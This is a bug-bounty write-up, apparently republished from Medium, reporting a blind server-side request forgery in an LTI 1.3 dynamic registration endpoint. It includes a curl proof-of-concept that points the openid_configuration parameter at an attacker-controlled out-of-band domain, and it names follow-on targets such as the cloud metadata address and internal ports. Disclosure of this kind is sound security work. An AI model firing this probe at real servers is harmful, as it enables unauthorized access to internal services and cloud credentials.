# Server-Side Request Forgery (SSRF) in LTI 1.3 Dynamic Registration Endpoint

- **Source URL:** https://medium.com/@yahiaemara11/server-side-request-forgery-ssrf-in-lti-1-3-dynamic-registration-endpoint-15e352ab956e
- **Fetched from:** https://medium.com/feed/@yahiaemara11
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/15000 (id 15000)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
#### Description

The LTI 1.3 Dynamic Registration endpoint accepts a URL via the openid\_configuration parameter and makes a server-side HTTP request to that URL to retrieve the LMS's OpenID configuration. The server does not validate or restrict the destination host, allowing an attacker to supply an arbitrary URL and force the server to make outbound requests to a location of the attacker's choosing — a classic SSRF.

#### Steps to Reproduce

1. Set up a domain you control connected to an out-of-band (OOB) interaction tool (e.g. Interactsh), to detect any DNS/HTTP traffic sent to it.
2. Send a request to the vulnerable endpoint, passing your OOB domain as the value of openid\_configuration:

curl -sS -m 25 "https://\<target>/lti/v1/dynamic\_registration?openid\_configuration=http://\<your-oob-domain>/probe®istration\_token=abc123"

1. The server responds with:

HTTP 500

{"error":"Error getting LMS openid\_configuration"}

1. Check your OOB listener log — you’ll see a DNS lookup and an HTTP request hit your domain, confirming the server made the outbound request.

#### Impact

This confirms blind SSRF. Depending on the hosting environment, it could potentially be used to:

- Reach internal services not exposed publicly
- Access cloud metadata endpoints (e.g. 169.254.169.254 on AWS/GCP/Azure)
- Probe internal ports via timing/error differences
